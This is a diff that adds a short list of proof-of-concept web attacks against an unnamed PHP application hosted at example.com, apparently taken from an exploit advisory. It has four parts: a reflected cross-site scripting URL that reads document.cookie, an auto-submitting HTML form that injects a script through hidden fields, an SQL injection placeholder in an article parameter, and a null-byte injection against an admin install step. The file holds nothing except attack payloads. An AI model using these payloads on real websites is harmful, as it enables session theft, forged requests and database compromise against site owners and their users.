@@ -1,0 +1,15 @@
+http://www.example.com/?session=&quot;&gt;&gt;&lt;&gt;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+&lt;html&gt;
+&lt;head&gt;&lt;/head&gt;
+&lt;body onLoad=javascript:document.form.submit()&gt;
+&lt;form action=&quot;http://www.example.com/index.php?session=0&amp;action=search&quot; method=&quot;POST&quot; name=&quot;form&quot;&gt;
+&lt;form method=&quot;post&quot; onSubmit=&quot;return validateprm(this)&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;prip&quot; value=&quot;true&quot;/&gt;&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;search&quot;/&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;kluc&quot; value=&quot;&amp;#34&amp;#39&amp;#39&amp;#39&amp;#60&amp;#62&amp;#62&amp;#62&amp;#62&lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt;&quot;&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+http://www.example.com/index.php?session=0&amp;action=read&amp;click=open&amp;article=[SQL CODE]
+
+http://www.example.com/admin/index.php?start=install&amp;step=file.type%00
